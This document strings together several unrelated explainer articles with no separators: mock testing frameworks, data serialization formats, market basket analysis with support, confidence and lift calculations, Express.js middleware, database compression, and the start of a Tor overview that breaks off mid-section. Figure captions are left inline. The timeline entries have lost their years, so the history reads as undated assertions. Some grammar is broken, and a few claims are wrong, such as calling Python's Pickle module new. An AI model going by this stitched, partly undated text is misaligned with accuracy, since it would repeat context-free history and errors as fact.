TypeMock uses a templating approach to create mocks , whereas Google Mock uses interitance .
Other frameworks include EasyMock , JMock , JMockit , and PowerMock .
Ease of use , maintainability and learning curve are some things to consider when choosing a framework .
What are some limitations of mock testing ?
Writing good mocks requires a good understanding of dependencies .
Otherwise , mocks may not accurately represent real - world behaviour .
Mocking can lead to tight coupling between mocks and code under test .
Overuse of mock objects as part of a suite of unit tests can result in a dramatic increase in the amount of maintenance that needs to be performed on the tests themselves .
Extreme Programming emphasizes unit testing and Test - Driven Development ( TDD ) .
Some adopters of Extreme Programming , based out of London , have begun to think about how testing influences coding .
They have been using " getters " to facilitate testing , but they are exploring new ideas .
They start avoiding " getters " and adopt composition , where test objects are passed via constructors .
This is years before the term Dependency Injection was used for this design approach .
Initial ideas of mock testing were presented at the XP2000 conference .
At this time , the approach is called Endo - Testing .
This name comes from the fact that mock objects are passed into the domain code and tested from within .
They claim that this simplifies testing architecture .
It avoids polluting domain code since assertions are not in production code but in unit tests .
EasyMock is released .
It 's the first library to provide dynamic mock objects .
Version 1.0.0 of jMock has been released .
This provides an expressive API over DynaMock Java library .
DynaMock itself comes from an earlier work by Nat Pryce , who introduced mocking to Ruby .
He emphasized assertions on messages passed between objects rather than just parameter values .
Framework Mockito v1.5 for Java is released .
By now , mock testing is more than just identifying where a test has failed .
It 's more about interactions among objects .
Mockito simplifies mocking by taking a different approach compared to jMock or EasyMock .
We do n't have to set up expectations for mock objects in advance .
We can simply create them and query them later after execution .
Nat Pryce and Steve Freeman rework jMock to produce jMock2 .
Google releases Google Mock , a mocking framework for C++ .
Version 1.7.0 be released in 2013 .
In 2015 , this will be absorbed into the GoogleTest project .
Data serialization and deserialization .
Source : Paul 2017 .
Data serialization is the process of converting data objects present in complex data structures into a byte stream for storage , transfer and distribution purposes on physical devices .
Computer systems may vary in their hardware architecture , OS , addressing mechanisms .
Internal binary representations of data also vary accordingly in every environment .
Storing and exchanging data between such varying environments requires a platform - and - language - neutral data format that all systems understand .
Once the serialized data is transmitted from the source machine to the destination machine , the reverse process of creating objects from the byte sequence called deserialization is carried out .
Reconstructed objects are clones of the original object .
The choice of data serialization format for an application depends on factors such as data complexity , need for human readability , speed and storage space constraints .
XML , JSON , BSON , YAML , MessagePack , and protobuf are some commonly used data serialization formats .
How does data serialization and deserialization work ?
Illustrating object serialized to flat textual ( XML ) format .
Source : CIS 2019 .
Computer data is generally organized into data structures such as arrays , tables , trees , classes .
When data structures need to be stored or transmitted to another location , such as across a network , they are serialized .
For simple , linear data ( number or string ) , there 's nothing to do .
Serialization becomes complex for nested data structures and object references .
When objects are nested into multiple levels , such as in trees , they are collapsed into a series of bytes , and enough information ( such as traversal order ) is included to aid reconstruction of the original tree structure on the destination side .
When objects with pointer references to other member variables are serialized , the referenced objects are tracked and serialized , ensuring that the same object is not serialized more than once .
However , all nested objects must be serializable too .
Finally , the serialized data stream is persisted in a byte sequence using a standard format .
ISO-8859 - 1 is a popular format for 1-byte representation of English characters and numerals .
UTF-8 is the world standard for encoding multilingual , mathematical and scientific data ; each character may take 1 - 4 bytes of data in Unicode .
What are the applications of Data Serialization ?
Serialization allows a program to save the state of an object and recreate it when needed .
Its common uses are : Persisting data on files – happens mostly in language - neutral formats such as CSV or XML .
However , most languages allow objects to be serialized directly into binarys using APIs such as the ` Serializable ` interface in Java , ` fstream ` class in C++ , or the Pickle module in Python .
Storing data into Databases – when program objects are converted into byte streams and then stored into DBs , such as in Java JDBC .
Transferring data through the network – such as web applications and mobile apps , passing on objects from client to server and vice versa .
Remote Method Invocation ( RMI ) – by passing serialized objects as parameters to functions running on a remote machine as if invoked by a local machine .
This data can be transmitted across domains through firewalls .
Sharing data in a Distributed Object Model – when programs written in different languages ( running on diverse platforms ) need to share object data over a distributed network using frameworks such as COM and CORBA .
However , SOAP , REST and other web services have replaced these applications now .
Could you list some text - based Data Serialization formats and their key features ?
Without being exhaustive , here are some common ones : XML ( Extensible Markup Language ) - Nested textual format .
Human - readable and editable .
Schema based validation .
Used in metadata applications , web services , data transfer , web publishing .
CSV ( Comma - Separated Values ) - Table structure with delimiters .
Human - readable textual data .
Opens as a spreadsheet or plaintext .
Used as a plaintext Database .
JSON ( JavaScript Object Notation ) - Short syntax textual format with limited data types .
Human - readable .
Derived from JavaScript data formats .
No need for a separate parser ( like XML ) since they map to JavaScript objects .
It can be fetched with an ` XMLHttpRequest ` call .
No direct support for ` DATE ` data type .
All data is dynamically processed .
Popular format for web API parameter passing .
Mobile apps use this extensively for user interaction and database services .
YAML ( YAML Ai n't Markup Language ) - Lightweight text format .
Human - readable .
Supports comments and thus easily editable .
Superset of JSON .
Supports complex data types .
Maps easily to native data structures .
Used in configuration settings , document headers , Apps with need for MySQL style self - references in relational data .
Could you list some binary Data Serialization formats and their key features ?
Without being exhaustive , here are some common ones : BSON ( Binary JSON ) - Created and internally used by MongoDB .
Binary format , not human - readable .
Deals with attribute - value pairs like JSON .
It includes datetime , bytearray and other data types not present in JSON .
Used in web apps with rich media data types such as live video .
The primary use is storage , not network communication .
MessagePack - Designed for data to be transparently converted from / to JSON .
Compressed binary format , not human - readable .
Supports static typing .
Supports RPC .
Better JSON compatibility than BSON .
The primary use is network communication , not storage .
Used in apps with distributed file systems .
protobuf ( Protocol Buffers ) - Created by Google .
Binary message format that allows programmers to specify a schema for the data .
It also includes a set of rules and tools to define and exchange these messages .
Transparent data compression .
Used in multi - platform applications due to easy interoperability between languages .
Universal RPC framework .
Used in performance - critical distributed applications .
How do the various serialization formats compare to performance characteristics ?
Uber Engineering finds that Protobuf / Thift with zlib / Snappy compression offers the best trade - off between speed and size .
Source : Kjelstrøm 2016 .
Here 's a brief comparison : Speed – Binary formats are faster than textual formats .
A late entrant , protobuf reports the best times .
With compressed data , the speed difference is even greater .
For apps that are n't data intensive or real time , JSON is preferable due to readability and being schema - less .
Data size – This refers to the physical space in bytes post serialization .
For small data , compressed JSON data occupies more space compared to binary formats like protobuf .
With larger files , the gap narrows .
Generally , binary formats always occupy less space .
Usability – Human readable formats like JSON are naturally preferred over binary formats .
For editing data , YAML is good .
For complex data types , cross - platform serialization libraries allow data structure to be defined in schemas ( for text formats ) or IDL ( for binary formats ) .
The Schema definition is easy in protobuf , with in - built tools .
Compatibility , extensibility – JSON is a closed format .
XML is average with schema version .
Backward compatibility ( extending schemas ) is best handled by protobuf .
Which are the programming languages that offer good serialization support ?
Platform - independent languages offer better support for data serialization .
Java , the pioneer of object serialization , supports in - built serialization ( ` Serializable ` Interface ) and custom serialization ( ` Externalizable ` Interface ) .
Python has newly introduced the Pickle module for the same .
However , the real - world environment is diverse and cross - platform .
Most web applications are opting for platform - neutral data serialization formats .
Open source formats JSON , XML , YAML , protobuf , MessagePack have support for all major programming languages such as C , C++ , Java , Python , Perl , Go , etc .
So the choice of language depends more on other factors , not on serialization any more .
What are the potential risks that affect data due to serialization ?
Naive use of object serialization may allow a malicious party with access to the serialization byte stream to read private data , create objects in an illegal or dangerous state , or obtain references to the private fields of deserialized objects .
Workarounds are tedious , not guaranteed .
Oracle has promised to do away with object serialization and allow programmers to choose from open formats such as JSON , XML , etc .
Open formats too have their security issues .
XML might be tampered with using external entities like macros or unverified DTD schema files .
JSON data is vulnerable to attack when directly passed to a JavaScript engine due to features like JSONP requests .
Programmers need to take care of such security vulnerabilities in their code , before deploying their applications .
Does the serialization process differ for Big Data ?
Even in Big Data , serialization refers to converting data into portable byte streams .
But schema control is another important target in Big Data .
Issues with data consistency such as blanks or wrong data values can be very costly , involving heavy data clean - up effort .
The next important aspect is the ability to split and reconstruct data easily ( for example by MapReduce ) .
JSON or XML may not work well .
Apache Hadoop has its own schema - based serialization format called Avro , similar to Protobuf .
Apache schemas are also defined based on JSON .
Apache Hadoop uses RPC to talk to different components .
Avro supports this very well .
The CSV format has been used in IBM Fortran machines from as early as 1972 .
The name CSV ( Comma - Separated Values ) itself was coined in the era of modern PCs , about 1983 .
The term serialization is used in the context of data for the first time .
In - built support for language - specific serialization is introduced in the Java language : ` Serializable ` interface for in - built support and ` Externalizable ` interface for user - defined implementation .
Older languages like C did not have direct functions to serialize data .
XML 1.0 becomes a W3C Recommendation .
XML , like its more popular cousin HTML , is derived from the original markup language SGML , which was created in the pre - internet era of the 1980s .
Douglas Crockford , credited with inventing JSON , popularized its use around the year 2001 .
However , he reveals later that JSON was used at Netscape as early as 1996 .
YAML , an extension of JSON , released its first version .
MessagePack , another binary serialization format derived from JSON releases with support for all major programming languages .
Protocol Buffers from Google are released to the public .
However , it 's been in use internally since 2001 .
BSON was released as an independent data serialization format in 2016 .
It originated in 2009 at MongoDB for its internal use .
Oracle decided to drop the Java serialization feature from future Java versions , calling it a “ horrible mistake ” , due to data security issues .
intends to replace it with a plugin framework where users can choose their serialization format such as JSON , XML or YAML .
Market basket analysis is a data mining technique , generally used in the retail industry in an effort to understand purchasing behaviour .
It looks for combinations of items that frequently occur in the same transaction .
In other words , it gives insights into items that may have some association or affinity .
For example , customers purchasing flour and sugar are also likely to buy eggs .
The outcome of the analysis is to derive a set of rules that can be understood as " if this , then that " .
Retailers can use these insights to do product placements or offer discounts .
In fact , market basket analysis is being applied outside retail .
Therefore , it 's more generally called Affinity Analysis .
Could you give examples of market basket analysis ?
Market basket analysis uncovers associations between products by looking for combinations of products that frequently co - occur in transactions .
Thus , supermarkets can identify relationships between products that people buy .
For example , customers who buy a pencil and paper are likely to buy an eraser or ruler .
A customer in an English pub buying a pint of beer without a bar meal is more likely to buy crisps / chips than somebody who did n't buy beer .
Someone who buys shampoo is likely to buy a conditioner .
Retailers can use this information to modify the store layout or offer discounts on shampoo but not on conditioners .
Online retails such as Amazon make product purchase recommendations .
If you add any item to your cart , Amazon will recommend other items that other customers often buy together with your selected item .
What are the applications of market basket analysis ?
Within retail , market basket analysis helps determine purchasing behaviour , build recommendation engines , customize loyalty programs , cross - sell , up - sell , place products in stores in the right places , offer the right combinations of discounts , and so on .
Beyond retail , affinity analysis has been used on medical data .
Does high BMI and smoking lead to greater chance of high blood pressure ?
Affinity analysis answers such questions .
In web browsing , it enables click stream analysis .
For example , given the last two clicks , how likely is the user to click a specific link ?
It can be used to detect intrusions .
In banking , credit card purchases are analysed to detect fraud and cross - sell .
In insurance , user profiles formed via market basket analysis can be used to flag fraudulent claims .
In telecom , market basket analysis can suggest the right bundle of services to retain customers or analyse calling patterns .
What 's the typical data pipeline for market basket analysis ?
Data for market basket analysis typically comes from point - of - sale ( POS ) transaction data or invoices .
These usually include a list of products purchased , unit price and quantity of each item .
To be statistically significant , the dataset must be large .
One analyst reported a dataset of 32 million records of 50 K unique items .
The next step is to look for combinations of items that occur most often together within a transaction .
The selection of the right algorithm is important here .
Otherwise , we will end up with too many combinations of items ( perhaps in millions ) that may be computationally difficult to analyse .
Once frequently occurring item combinations are identified , we next look for associations .
This step is often called Association Rule Mining .
The last step is to pick out strong association rules , seek explanations as to why such associations exist and drive business decisions .
The usefulness or " interestingness " of a rule is application dependent .
Could you give more details on Association Rule Mining ?
Graphical view of the rules : coffee and toast show a high lift .
Source : García 2018 .
Association Rule Mining counts the frequency of items that occur together across a large collection of items or actions .
The goal is to find associations that take place together far more often than you would find in a random sampling of possibilities .
The output of the above will be a set of association rules in the following form : ` IF { item 1 , item 2 } THEN { item 3 } ` .
This states that when items 1 and 2 are purchased , then item 3 is likely to be purchased with a certain probability .
The first part of the rule is called antecedent .
The second part is called consequent .
For example , a customer who buys pencil and paper ( antecedent ) is likely to buy an eraser ( consequent ) .
But how likely is such a customer to buy an eraser ?
To quantify this , we have a few measures : support , confidence , and lift .
These tell us how important or reliable an association rule is .
Could you explain the terms Support , Confidence and Lift ?
Measures to evaluate association rules .
Source : Li 2017 .
These are common quantitative measures to identify the most important association rules : Support : Given all transactions , support is the percentage of transactions that contain a given item combination .
Often , combinations that fall below a support threshold are ignored in further analysis .
When a dataset has thousands of items and millions of transactions , a threshold of 0.01 % is reasonable .
Confidence : Given item A is purchased , what 's the chance that the customer will buy item C ?
This question is answered by the confidence measure .
Thus , rather than looking at just the probability of purchasing item C ( which support does ) , confidence looks at conditional probability .
Lift : Suppose data shows that items A and C occur together in many transactions .
Do A and C have an association or are they occurring together purely by chance ?
This question is answered by the lift measure .
Association rules must satisfy both minimum support and minimum confidence values .
To filter the results further to a smaller list , lift is a popular measure .
Could you give example calculations of Support , Confidence and Lift ?
For example , given a million transactions , 24 K transactions contain { flour , sugar } ; 30 K transactions contain { eggs } ; 20 K transactions contain both { flour , sugar } and { eggs } .
Thus , Support({flour , sugar } ) = 24 K / 1 M = 0.024 Support(eggs ) = 30 K / 1 M = 0.03 Support({flour , sugar } , eggs ) = 20 K / 1 M = 0.02 Confidence({flour , sugar}->eggs ) = Support({flour , sugar } , eggs ) / Support({flour , sugar } ) = 0.02 / 0.024 = 0.83 Confidence(eggs->{flour , sugar } ) = Support({flour , sugar } , eggs ) / Support(eggs ) = 0.02 / 0.03 = 0.66 Lift({flour , sugar } , eggs ) = Support({flour , sugar } , eggs ) / ( Support({flour , sugar})*Support(eggs ) ) = 0.02 / ( 0.024 * 0.03 ) = 27.8 Note that Confidence is directional but Lift is not .
In the above example , a purchase of { flour , sugar } drives purchase of eggs more strongly than eggs driving purchase of { flour , eggs } .
A lift value of 1 implies there 's no association .
A value of more than 1 implies a positive association .
In our example , the denominator value ( 0.024 * 0.03 ) = 0.00072 = 0.072 % is how often both items would occur together if they had no relationship .
Lift gives us a measure of association relative to being random .
What are the tools or packages available to do market basket analysis ?
Visualizing support , confidence and lift using arulesViz package in R. Source : McColl 2017 .
R language has the arules package for association rule mining .
This includes C implementations of Apriori and Eclat algorithms .
The Arulesviz package has useful visualizations that can help in exploratory analysis .
It includes visualizations of support , confidence and lift .
KNIME offers a tool for market basket analysis .
It provides a graphical block - diagram - based interface that can be ideal for non - programmers .
It offers the Apriori algorithm in traditional as well as the more optimized Borgelt implementation .
In Python , we can use the MLxtend package .
Christian Borgelt has also released a C implementation that can be compiled for the Python environment .
He calls this PyFIM , where FIM stands for Frequency Itemset Mining .
This decade sees progress in barcode technology that has become widely used in the retail industry .
It therefore becomes easy to collect vast amounts of purchasing data .
This leads to what can be called information - driven marketing .
Piatetsky - Shapiro analyzes and presents strong rules discovered in databases using different measures of interestingness .
Market basket analysis of 1.2 million market baskets from 25 Osco Drug stores brings out an unexpected association between diapers and beer .
Subsequently , this example has become commonly used in data mining literature .
In reality , the managers at Osco did not exploit this " interesting " ( and not significant ) association , but they became aware of what 's possible with market basket analysis .
Based on the concept of strong rules , Agrawal , Imielinski , and Swami introduce the problem of mining association rules from transaction data .
The term association rules can be attributed to Agrawal and his team .
They also propose an algorithm for discovering these rules .
Apriori algorithm reduces the number of itemsets efficiently .
Source : Jabeen 2018 .
Rakesh Agrawal and Ramakrishnan Srikant publish the Apriori algorithm .
This outperforms earlier algorithms , particularly when datasets are large .
At the IEEE International Conference on Data Mining ( ICDM ) in December 2006 , this was identified as one of the ten most important algorithms in the field of data mining .
Apriori uses support and confidence but not lift .
A lift is something we use as a final step .
Christian Borgelt provides C implementation of the Apriori algorithm .
In R language , for association rule mining , version 1.6 of the arules package is published on CRAN .
Summarizing the pros and cons of Express .
Source : Kharchenko 2017 .
Express is a minimalistic web framework based on Node.js .
It 's essentially a series of middleware function calls , each of which does something specific .
Express is not opinionated , which is also why you 're free to use it in different ways .
For example , it does n't enforce a particular design pattern or a folder structure .
Express is an open source project that 's been managed by the Node.js Foundation since 2016 .
Express is a good adoption .
It 's part of the MEAN stack .
It 's also being used by many other web frameworks , such as Kraken , LoopBack , Keystone and Sails .
However , it 's been said that Express is not suited for large projects / teams .
Why should I use Express.js when there 's already Node.js ?
A typical HTTP request / response call flows with Node and Express .
Source : Turing School 2019 .
While it 's possible to build a web app or an API service with only Node.js , Express.js simplifies the development process .
Express itself is based on Node .
It 's been said that Express ... provides a thin layer of fundamental Web application features , without obscuring Node.js features that you know and love .
For example , sending an image is complex in Node but easily done in Express .
In Node , the route handler is a large monolith but Express enables more modular design and maintainable code .
Node is a JavaScript runtime for server - side execution .
Thus , Node can be used as the app server for your web application .
Express is seen as a lightweight web framework .
Express comes with a number of " middleware " software that implement out - of - the - box solutions for typical web app requirements .
HTTP requests / responses are relayed by Node to Express , whose middleware then does the processing .
Could you explain the concept of middleware in Express.js ?
Express enables a series of middleware calls .
Source : Grewe 2019 .
When client requests are received , the server does n't handle all of them alike .
For example , submitting a form is handled differently from clicking a like button .
Thus , each request has a well - defined handler , to which it must be properly routed .
Middleware sits in the route layer .
Express is basically a routing layer composed of many modular processing units called middleware .
Requests are processed by middleware functions before being sent to the handlers .
A request - response cycle can invoke a series of middleware functions .
A middleware can access and modify the request and response objects .
Once a middleware function has completed , it can either pass control to the next middleware function ( by calling ` next ( ) ` ) or end the cycle by sending a response to the client .
Since middleware can send responses , even the request handlers can be treated or implemented as middleware .
Middleware can also be called after the request is processed and a response is sent to the client .
But in this case , middleware ca n't modify the request and response objects .
What are the different types of Express.js middleware ?
Elements of an app - level middleware call .
Source : Express 2018e .
There are a few types of Express middleware : Application - level : These are bound to an instance of the application object ` express ( ) ` .
They are called for every app request .
The middleware signature is ` function ( req , res , next ) ` .
Router - level : These are bound to an instance of the router ` express .
Router ( ) ` .
Otherwise , they work similar to app - level middleware .
Error - handling : Any middleware can throw an error .
These can be caught and handled by error - handling middleware .
These middleware have an extra argument in their signature : ` function ( err , req , res , next ) ` .
Built - in : These are built into the default Express installation .
These include ` express.static ` , ` express.json ` and ` express.urlencoded ` .
Third - party : Express has a rich ecosystem of third - party developers contributing useful middleware .
Some of these are maintained by the Express team , while others come from the community .
For an example list of some Express middleware , visit the Express Resources Middleware page .
What are some useful or recommended middleware for Express.js ?
Without being exhaustive , here is some useful middleware : body - parser : To parse HTTP request body .
compression : Compresses HTTP responses .
cookie - parser : Parse cookie header .
cookie - session : Establish cookie - based sessions .
cors : Enable Cross - Origin Resource Sharing ( CORS ) .
csrf : Protect from Cross - Site Request Forgery ( CSRF ) exploits .
errorhandler : Development error - handling / debugging .
morgan : HTTP request logger .
The alternatives are Winston and Bunyan .
timeout : Set a timeout period for HTTP request processing .
helmet : Helps secure your apps by setting various HTTP headers .
passport : Authentication using OAuth , OpenID and many others .
express - async - handler : For Async / await support .
An alternative is @awaitjs / express .
express - cluster : Run express on multiple processes .
As a beginner , how can I get started with Express.js ?
Folder structure created by express - generator .
Source : Express 2018c .
A beginner should first learn the basics of JavaScript , Node.js and Express.js , in that order .
The Express website has useful tutorials .
The routing guide is a good place to start .
For in - depth understanding , or as a handy reference , use the API Reference .
Install Node.js first .
Then install Express.js : ` npm install express --save ` Since Express is unopinionated , your folder structure can be anything that suits your project .
However , express - generator is a package that gives beginners a basic structure to start with .
This installs the express command - line tool , which can be used to initialize your app .
You get to choose your preferred templating engine ( pug , ejs , handlebars ) and styling support ( less , stylus , compass , sass ) .
Where is Express.js not a suitable framework ?
Express is not recommended for large projects .
Although Express is lightweight , for performance - critical apps such as highly scalable REST API services , I prefer to use specialized Node frameworks such as fastify , restana , restify , koa , or polka .
What are some best practices when using Express.js ?
Adopt a modular structure to make your code more manageable .
In production , log requests and API calls minimize debug logs .
A package such as debug might help in configuring the logging contexts .
Pipe logs from ` console.log ( ) ` or ` console.error ( ) ` to another program since saving them to file or printing them to the console makes the calls synchronous .
In general , avoid synchronous calls .
Use Node 's command - line flag ` --trace - sync - io ` ( during development only ) to be warned when synchronous calls happen .
For performance , use compression middleware .
For security , use a helmet .
To run multiple instances on multicore systems , launch your app on a cluster of processes .
The cluster can be frontended with a load balancer , which can be a reverse proxy such as Nginx or HAProxy .
Handle errors using try - catch or promises .
Do n't listen for ` uncaughtException ` event to handle errors .
This might be a way to prevent your app from crashing , but a better way is to use a process manager ( StrongLoop Process Manager , PM2 , Forever ) to restart the app automatically .
Ryan Dahl and others at Joyent developed Node.js with initial support for only Linux .
The name Node was coined in March .
Being open source , version 0.1.0 was released on GitHub in May. In November , Ryan Dahl presented Node.js at JSConf in Berlin .
As a web development framework based on Node.js , v1.0.0 of Express.js has been released .
The development of Express can be traced to January 2010 when v0.1.0 was committed on GitHub .
To manage packages for Node.js , Node Package Manager ( NPM ) has been released .
An early preview of NPM can be traced to 2009 , by Isaac Z. Schlueter .
Valeri Karpov at MongoDB proposes a full - stack solution that he terms the MEAN stack : MongoDB , Express , Angular and Node .
Given that three of these are based on JavaScript , this promotes the demand for full - stack developers who can handle both frontend and backend code .
StrongLoop acquires commercial rights to Express .
StrongLoop itself offers an open source API framework called LoopBack on top of Node and Express .
Some community folks criticize this " sponsorship " or " sale " of what was an open source project .
Joyent , IBM , Microsoft , PayPal , Fidelity , SAP and The Linux Foundation come together to establish the Node.js Foundation .
IBM acquired StrongLoop , a company that specializes in Node.js , Express.js and API management .
StrongLoop is said to offer " robust implementation , making Node.js enterprise - grade " .
This acquisition could mean better adoption of Node and Express in the corporate world .
Doug Wilson , one of the main contributors to Express , decides to stop working on Express .
This is mainly because what was once an open source project is now controlled by IBM / StrongLoop .
The Express community also state their unhappiness with the way the framework is managed .
Meanwhile , in a move towards open governance , Express has handed over to the Node.js Foundation as an incubation project .
Version 4.16.4 of Express has been released .
The same month , version 5.0.0-alpha.7 was released .
Version 5.0.0-alpha.1 can be traced back to November 2014 .
Compression removes blank values ( white ) and encodes repetitive values .
Source : Faust 2013 .
Database compression is a set of techniques that reorganizes database content to save on physical storage space and improve performance speeds .
Compression can be achieved in two primary ways : Lossless : Original data can be fully reconstructed from the compressed data .
Lossy : Reduction in data size due to deliberate compromise in quality .
Depending on the nature and extent of redundancy in the data patterns , the compression method might work within a data field , across a row / column of data , across an entire data page or in hierarchical data structures .
Compression methods applied to text / primitive data are different from those for audio - video data .
While most compression algorithms are open standards , companies like Oracle employ proprietary algorithms too .
Run - length encoding , prefix encoding , compression using clustering , sparse matrices , dictionary encoding are all popular standard compression techniques used in database applications .
What are the benefits of database compression ?
Size - The most obvious reason for database compression is the reduction in the overall database storage footprint of the organization .
It applies relational ( tables ) , unstructured ( files ) , indices , data transfer over the network and backup data .
Depending on the data cardinality ( extent of repetition in data values ) , compression can reduce storage consumption from 60 % to as low as 20 % of the original space .
Sparsely populated tables ( lots of zeros , spaces in data ) compress much better .
Speed – DB Read operations become much faster ( up to 10X ) as smaller amounts of physical data need to be moved from disk to memory .
However , the performance of writing operations is marginally affected as there is an extra step of decompression involved .
Resource Utilization - More data will fit into a page on the disk , in memory or in the buffer pool , thereby minimizing I / O costs .
Because I / O occurs at the page level , a single I / O will retrieve more data .
This increases the likelihood that data resides in the cache because more rows fit on a physical page .
Compression also results in a massive reduction in backup / restore times .
What are the disadvantages of database compression ?
When should we avoid it ?
A local symbol table is a necessary overhead .
Source : Adapted from Shearer 2013 , slide 4 .
Most compression algorithms build an internal encoding dictionary to manage the compression keywords .
When the database size is small , compressed files might be larger than uncompressed files due to additional dictionary creation .
For any DB , compression and decompression is a task overhead above its regular DML / DDL operations .
It consumes additional CPU / memory .
So compression must be attempted only when the gain in CPU / memory due to optimised page reads is much larger than the compression overhead .
While compression might happen in parallel as a background task , decompression introduces client - side latency as it happens in the foreground after a client query .
However , commercial databases like Oracle support advanced compression techniques where DB reading can happen without decompression .
Compression is not recommended when the cardinality of data is poor .
For numerical data and non - repetitive strings , do n't compress your data .
For data types like ` BLOB ` data ( images , audio ) , depending on the compression algorithm , storage size can either reduce or increase .
In summary , it 's important to estimate likely storage and performance benefits for any algorithm before implementing it on live databases .
What 's the effect of compression on common data types ?
Compression is a DDL function that can be selectively applied to tables , indexes or partitions with ` CREATE ` , ` ALTER ` and ` BACKUP ` commands .
Data compression applies to these database objects – heaps , clustered indexes , non - clustered indexes , partitions , indexed views .
Row - level compression converts fixed length data types into variable length types .
Fields created as fixed length types , such as ` char 100 ` , might not fill the entire 100 characters for every record .
So this works well for fixed length text and numeric fields ( ` char ` , ` int ` , ` float ` ) .
For example , storing 23 in an ` int ` column will require just 1 byte when compressed instead of the entire 4 bytes allocated .
No space is consumed for NULL or 0 values .
Page compression is more advanced .
It internally invokes row compression .
Commonality in page data is extracted and encoded , one column at a time or all columns together .
Actual data is then replaced by the codes .
Large objects are not directly compressed .
Instead , they are stored on a separate page for direct retrieval ( ` LOB ` or ` BLOB ` types ) .
Unicode values are compressed into 2 bytes , regardless of locale .
This results in nearly 50 % savings for most locales .
What are some popular database compression techniques ?
Prefix encoding .
Source : Popov 2012 .
Databases avoid lossy compression at the backend .
However , applications might accept a lower quality using lossy techniques , especially for images , audio , videos .
Among lossless techniques , all compressed data is stored in binary .
Run - Length Encoding is the simplest .
In this technique , sequential data is scanned for repeated symbols , such as pixels in an image , and replaced by short codes called " run " .
For a gray scale image , the run length code is represented by ` { Si , Ci } ` , where ` Si ` is the symbol or intensity of pixels and ` Ci ` is the count or the number of repetitions of ` Si ` .
Prefix encoding is another basic technique that works well only on homogeneous data .
The first part of the data fields are matched for commonality , not the entire field .
Hence , the name ' prefix ' encoding .
Dictionary compression is another page - level technique where common codes are consolidated into a dictionary and stored under the header row .
The algorithm calculates the number of bits ( X ) needed to encode a single attribute of the column from unique attribute values .
It then calculates how many of these X - bit encoded values can fit into 1 , 2 , 3 , or 4 bytes .
How does database compression vary from generic data compression techniques ?
Storage Size Compression .
Source : Jayaram 2018 .
Data compression applies to within a field , the size of a single data item can be minimised .
Here , both lossless and lossy techniques are popular .
On the other hand , database compression is an aggregate technique .
It aims to compress data across values in a row , column or page .
Along with applying compression at DB level , it 's quite common to apply data compression at field level too .
In image compression , for example , a lossy BMP - to - JPG conversion is done using sampling and quantisation at field level .
Then , BLOB data fields might be compressed at DB level using lossless methods .
While NULL values can not be further compressed individually , when a series of NULL values occurs in a DB , compression techniques such as the Sparse Column can optimise storage of the NULLs collectively .
Database compression techniques not only compress actual data , they also act on derived entities like indices , views , clusters and heaps .
However , for derived entities like indices , there 's a small CPU overhead to reconstruct the key column values during index lookup or scans .
This can be minimized by keeping the prefixes locally in the block .
How do compression techniques compare between relational and hierarchical databases ?
There is no major variation in the compression algorithms applied on relational and hierarchical DBs .
It 's just a difference in nomenclature .
Hierarchical DBs have segments similar to tables in RDBMS .
And fields in the segment compared with columns .
However , in hierarchical databases , segments are implicitly joined with each other .
Because of this , the I / O paging process would vary , so algorithms must consider the page sizes .
How do large - scale software applications handle database compression ?
Facebook uses a real - time compression algorithm , Zstandard with super fast decoders plus a dictionary compression for small data .
Google uses Snappy , a high speed compressor algorithm in their BigTable and MapReduce systems .
Commercial DBMS like SQL Server use row , column and page level compression .
SQL Server uses a proprietary XPRESS algorithm for backup compression .
Oracle uses an internal compression technique called Oracle Advanced Compression .
Open source MySQL uses the LZ77 algorithm for its InnoDB table compressions .
As early as the 1940s , Information Theory established the theoretical background behind lossless and lossy compression .
In the 1970s , major relational databases – Ingres , MS SQL Server and Sybase – entered the commercial market .
They support primitive keyword - based compression techniques built into their systems .
The LZ77 lossless compression algorithm , as the name suggests , has been released .
This forms the basis of compression schemes for PNG and ZIP formats .
Implementations of the algorithm have spread across most commercial databases .
Compression in MySQL uses LZ77 via the zlib library .
Oracle Database 11 g Release 1 introduces OLTP Table compression , now called Advanced Row Compression , which maintains compression during all types of data manipulation operations .
Oracle has been implementing compression techniques in their DBs since much earlier .
But after the acquisition of Sun , the techniques became more robust and hardware integrated .
In Oracle Database12c , compression method can be selected based on data usage .
Source : Breysse 2014 , slide 11 .
Designed for the cloud , Oracle releases Oracle Database 12c .
It includes compression methods used in the earlier Oracle Database 11 g release and adds new ones : heat map , automatic data optimization , temporal optimization , hybrid columnar compression .
The Heat map method monitors data usage and selects the most suitable compression method .
Tor logo .
Source : Tor Project 2019d .
Using a distributed network of nodes on the Internet , Tor provides users with anonymity .
Your Internet Service Provider ( ISP ) , governments or corporations ca n't know which sites you 've been visiting .
Authorities also can not censor content or know your location .
Tor is able to do this because it hides your IP address and the addresses of sites you visit .
Your packets are bounced across multiple nodes , with each node having only information about the previous and next hops along the route .
Moreover , Tor nodes are run by volunteers without any centralized control .
Tor is a network service , not a peer - to - peer service like BitTorrent .
The easiest way to use Tor is to use the Tor Browser .
There are many other software and services based on Tor .
Why should I use Tor ?
An introduction to Tor .
Source : Tor Project 2019d .
As an individual , you can use Tor to prevent websites from tracking your activities online and serving you annoying ads .
More importantly , your ISP or government may censor some websites .
Tor helps in bypassing censorship .
In chat rooms where socially sensitive topics are discussed ( rape counselling , suicide prevention , terminal illness ) , Tor helps users preserve their anonymity .
This sort of anonymity is even more important for journalists or whistleblowers who are exposing high - level scams .
Even as a normal user , you can use Tor to hide your location for your own safety .
In general , Tor protects against Internet surveillance based on traffic analysis .
Even if your message is encrypted , there 's a great deal of information in packet headers ( address , size , etc .
) .
Timing of packets can be analysed .
Statistical techniques can be employed to reveal patterns .
Tor overcomes traffic analysis .
What are the building blocks of Tor ?
Three Tor nodes route traffic from source to destination .
Source : Ashwin S 2016 .
When using Tor , traffic is routed through three Tor nodes or relays between source and destination .
All Tor nodes are run by volunteers .
Hence , there 's no centralized control .
A connection across the Tor network consists of the following : Tor Client : Either the Tor Browser or a Tor - enabled program on your computer .
This adds three layers of encryption to an outgoing message ( and decrypts an incoming message ) .
Guard Node : First Tor node to receive your message .
It removes one layer of encryption .
It knows the next node but not the exit node or destination .
Relay Node : Intermediate node .
It removes another layer of encryption to obtain who 's the exit node .
Exit Node : Removes the final layer of encryption to reveal the destination .
It can read the original message but does n't know who sent it .
Traffic exits this node without Tor encryption .
Circuit : The path defined from source to destination via the three Tor nodes .
Could you explain Tor 's Onion Routing ?
Messages are encrypted in multiple layers .
Source : Leiva - Gomez 2013 .
Just as an onion has multiple layers , Tor traffic is encrypted repeatedly and then routed through multiple nodes .
